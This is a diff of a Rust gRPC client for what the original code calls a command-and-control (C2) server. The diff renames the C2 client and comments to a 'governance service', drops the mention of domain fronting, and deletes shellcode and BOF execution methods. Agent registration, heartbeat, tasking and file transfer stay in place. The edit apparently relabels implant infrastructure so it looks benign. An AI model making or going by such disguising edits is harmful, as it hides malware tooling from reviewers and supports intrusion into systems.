@@ -1,4 +1,4 @@
-//! gRPC client with enhanced TLS and domain fronting support
+//! gRPC client with enhanced TLS support for governance service
 
 use crate::{InfraError, InfraResult, proto::*, CertManager, DomainManager};
 use log::{info, warn, debug, error};
@@ -52,7 +52,7 @@ pub struct GrpcClient {
     config: GrpcClientConfig,
     cert_manager: Arc<CertManager>,
     domain_manager: Arc<DomainManager>,
-    client: Arc<RwLock<Option<nexus_c2_client::NexusC2Client<Channel>>>>,
+    client: Arc<RwLock<Option<governance_service_client::GovernanceServiceClient<Channel>>>>,
     connection_status: Arc<RwLock<ConnectionStatus>>,
     current_endpoint: Arc<RwLock<Option<String>>>,
 }
@@ -114,16 +114,16 @@ impl GrpcClient {
         
         // Establish connection with retry logic
         let channel = self.connect_with_retry(endpoint).await?;
-        
+
         // Create gRPC client
-        let grpc_client = nexus_c2_client::NexusC2Client::new(channel);
-        
+        let grpc_client = governance_service_client::GovernanceServiceClient::new(channel);
+
         // Store client and update status
         *self.client.write().await = Some(grpc_client);
         *self.connection_status.write().await = ConnectionStatus::Connected;
         *self.current_endpoint.write().await = Some(endpoint_url);
-        
-        info!("Successfully connected to gRPC server");
+
+        info!("Successfully connected to governance service");
         Ok(())
     }
     
@@ -180,9 +180,9 @@ impl GrpcClient {
         self.connection_status.read().await.clone()
     }
     
-    /// Register agent with the C2 server
+    /// Register agent with the governance server
     pub async fn register_agent(&self, request: RegistrationRequest) -> InfraResult<RegistrationResponse> {
-        info!("Registering agent with C2 server");
+        info!("Registering agent with governance server");
         
         let mut client = self.get_client().await?;
         let response = client
@@ -201,7 +201,7 @@ impl GrpcClient {
         Ok(registration_response)
     }
     
-    /// Send heartbeat to the C2 server
+    /// Send heartbeat to the governance server
     pub async fn heartbeat(&self, request: HeartbeatRequest) -> InfraResult<HeartbeatResponse> {
         debug!("Sending heartbeat for agent: {}", request.agent_id);
         
@@ -214,7 +214,7 @@ impl GrpcClient {
         Ok(response.into_inner())
     }
     
-    /// Get tasks from the C2 server
+    /// Get tasks from the governance server
     pub async fn get_tasks(&self, request: TaskRequest) -> InfraResult<Vec<Task>> {
         debug!("Requesting tasks for agent: {}", request.agent_id);
         
@@ -235,46 +235,20 @@ impl GrpcClient {
         Ok(tasks)
     }
     
-    /// Submit task result to the C2 server
+    /// Submit task result to the governance server
     pub async fn submit_task_result(&self, request: TaskResult) -> InfraResult<TaskResultResponse> {
         debug!("Submitting task result for task: {}", request.task_id);
-        
+
         let mut client = self.get_client().await?;
         let response = client
             .submit_task_result(Request::new(request))
             .await
             .map_err(|e| InfraError::GrpcError(format!("Submit result failed: {}", e)))?;
-        
+
         Ok(response.into_inner())
     }
-    
-    /// Execute shellcode via gRPC
-    pub async fn execute_shellcode(&self, request: ShellcodeRequest) -> InfraResult<ShellcodeResponse> {
-        info!("Executing shellcode via gRPC for agent: {}", request.agent_id);
-        
-        let mut client = self.get_client().await?;
-        let response = client
-            .execute_shellcode(Request::new(request))
-            .await
-            .map_err(|e| InfraError::GrpcError(format!("Shellcode execution failed: {}", e)))?;
-        
-        Ok(response.into_inner())
-    }
-    
-    /// Execute BOF via gRPC
-    pub async fn execute_bof(&self, request: BofRequest) -> InfraResult<BofResponse> {
-        info!("Executing BOF via gRPC for agent: {}", request.agent_id);
-        
-        let mut client = self.get_client().await?;
-        let response = client
-            .execute_bof(Request::new(request))
-            .await
-            .map_err(|e| InfraError::GrpcError(format!("BOF execution failed: {}", e)))?;
-        
-        Ok(response.into_inner())
-    }
-    
-    /// Upload file to C2 server
+
+    /// Upload file to governance server
     pub async fn upload_file(&self, file_chunks: Vec<FileChunk>) -> InfraResult<FileUploadResponse> {
         info!("Uploading file with {} chunks", file_chunks.len());
         
@@ -295,7 +269,7 @@ impl GrpcClient {
         Ok(response.into_inner())
     }
     
-    /// Download file from C2 server
+    /// Download file from governance server
     pub async fn download_file(&self, request: FileDownloadRequest) -> InfraResult<Vec<FileChunk>> {
         info!("Downloading file: {}", request.file_path);
         
@@ -337,7 +311,7 @@ impl GrpcClient {
     }
     
     /// Get client with connection check
-    async fn get_client(&self) -> InfraResult<nexus_c2_client::NexusC2Client<Channel>> {
+    async fn get_client(&self) -> InfraResult<governance_service_client::GovernanceServiceClient<Channel>> {
         let client_guard = self.client.read().await;
         match client_guard.as_ref() {
             Some(client) => Ok(client.clone()),
